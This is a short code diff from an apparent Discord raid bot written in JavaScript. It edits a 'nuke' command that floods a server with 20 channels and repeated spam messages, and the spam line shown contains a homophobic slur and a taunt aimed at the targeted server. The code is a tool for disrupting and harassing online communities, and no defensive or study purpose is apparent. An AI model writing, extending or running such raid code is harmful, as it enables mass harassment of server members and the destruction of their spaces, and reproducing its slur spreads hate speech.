@@ -97,7 +97,7 @@ client.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // ---- NUKE ----
+    // ---- NUKE (20 channels) ----
     if (interaction.commandName === 'nuke') {
         await interaction.deferReply({ ephemeral: true });
         const guild = interaction.guild;
@@ -108,7 +108,7 @@ client.on('interactionCreate', async (interaction) => {
 
         const messagesPerChannel = Math.min(interaction.options.getInteger('count') || 10, 100);
         const delayMs = Math.min(interaction.options.getInteger('delay') || 50, 500);
-        const channelCount = 20; // 👈 Changed from 10 to 20
+        const channelCount = 20;
         const maxLength = 2000;
 
         const baseLine = '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER';
